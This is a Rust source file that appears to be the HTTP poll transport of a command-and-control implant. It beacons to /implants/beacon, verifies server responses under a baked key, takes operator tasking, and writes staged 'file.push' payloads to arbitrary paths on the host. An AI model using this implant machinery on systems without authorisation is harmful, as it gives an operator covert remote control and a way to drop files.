use std::io::Read;

use prost::Message;

use super::{accept_tasking, Contact};
use crate::error::ContactError;
use crate::profile::Profile;
use crate::handlers::Outcome;
use crate::session::{Attempt, Session};
use crate::wire::{Frame, StagedChunk, TaskRequest};

/// The envelope POST cycle (architecture.md Sec 8): one POST to
/// /implants/beacon is one poll contact. The request body carries the
/// handshake plus the accumulated batch; the response carries the handshake
/// answer, the staged chunk runs answering this cycle's demands, then queued
/// tasking. The batch leaves only after a processed response, so a failed
/// POST re-sends it verbatim.
pub struct Poll {
    url: String,
    agent: ureq::Agent,
}

impl Poll {
    pub fn new(profile: &Profile) -> Poll {
        let url = super::beacon_url(&profile.enroll_url);
        let pinned = crate::trust::parse_pem(&profile.ca_pem)
            .iter()
            .filter_map(|der| crate::trust::parse_der(der))
            .collect::<Vec<_>>();
        Poll {
            agent: crate::transport::build_agent(&url, &pinned, profile.request_timeout_seconds),
            url,
        }
    }
}

impl Contact for Poll {
    fn serves(&self, url: &str, mode: &str) -> bool {
        // A schemed web URL polls on a poll bake (the stream bake's web URL
        // belongs to the WebSocket carriage).
        url.contains("://") && !url.starts_with("quic") && mode != "stream"
    }

    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let demands = session.outbox.take_demands();
        let batch = session.outbox.batch();
        let mut frames = Vec::with_capacity(1 + batch.len());
        frames.push(session.handshake_frame());
        frames.extend(batch.iter().cloned());
        let (body, content_type) = session.encode_outgoing(&frames);

        let response = self
            .agent
            .post(&self.url)
            .set("Content-Type", content_type)
            .send_bytes(&body)?;
        let status = response.status();
        let mut bytes = Vec::new();
        response.into_reader().take(64 << 20).read_to_end(&mut bytes)?;
        if status != 200 {
            return Err(ContactError::Transport(format!("status {status}")));
        }
        let inbound = session
            .decode_incoming(&bytes)
            .ok_or(ContactError::Protocol(
                "the contact response did not verify under the baked key",
            ))?;
        let first = inbound
            .first()
            .ok_or(ContactError::Protocol("the contact response carried no frames"))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        // The batch crossed: its frames are delivered, and this cycle's
        // demands are answered below.
        session.outbox.batch_crossed(batch.len());
        accept_staged(session, &inbound, &demands);
        accept_tasking(session, &inbound[1..], acks);
        Ok(Attempt::Crossed)
    }
}

/// The staged half of a poll response: each demand's chunk run,
/// terminal-flagged, in demand order (the server answers demands before new
/// tasking). A run that never terminates fails the task -- the operator sees
/// the cause on the task itself.
fn accept_staged(session: &mut Session, inbound: &[Frame], demands: &[TaskRequest]) {
    let mut index = 1;
    for task in demands {
        let mut payload: Vec<u8> = Vec::new();
        let mut terminal = false;
        while index < inbound.len() && !terminal {
            let Ok(chunk) = StagedChunk::decode(inbound[index].payload.as_ref()) else {
                break;
            };
            if chunk.task_id != task.task_id {
                break;
            }
            index += 1;
            payload.extend_from_slice(&chunk.data);
            terminal = chunk.terminal;
        }
        if !terminal {
            session.outbox.result(&task.task_id, Outcome::Failed, "staged payload stream ended without a terminal chunk");
            continue;
        }
        let (outcome, output) = dispatch_staged(&task.verb, &task.arguments, &payload);
        session.outbox.result(&task.task_id, outcome, &output);
    }
}

/// The staged dispatch arm: the payload arrived, the arguments carry the
/// grammar. Only file.push uses the staged arm today; anything else fails
/// with the grammar named.
pub fn dispatch_staged(verb: &str, arguments: &str, payload: &[u8]) -> (Outcome, String) {
    use sha2::{Digest, Sha256};
    if verb != "file.push" {
        return (Outcome::Failed, format!("{verb}: this build carries no staged handler for the verb"));
    }
    let Some(space) = arguments.rfind(' ') else {
        return (Outcome::Failed, "file.push staged expects '<path> sha256:<hex>'".into());
    };
    let path = arguments[..space].trim();
    let Some(expected) = arguments[space + 1..].trim().strip_prefix("sha256:") else {
        return (Outcome::Failed, "file.push staged expects '<path> sha256:<hex>'".into());
    };
    let actual: String = Sha256::digest(payload).iter().map(|b| format!("{b:02x}")).collect();
    if !actual.eq_ignore_ascii_case(expected) {
        return (Outcome::Failed, format!("file.push staged: payload hash mismatch: expected {expected}, received {actual}"));
    }
    if let Some(parent) = std::path::Path::new(path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    match std::fs::write(path, payload) {
        Ok(()) => (Outcome::Succeeded, format!("{path}: {} bytes written", payload.len())),
        Err(err) => (Outcome::Failed, format!("write {path}: {err}")),
    }
}
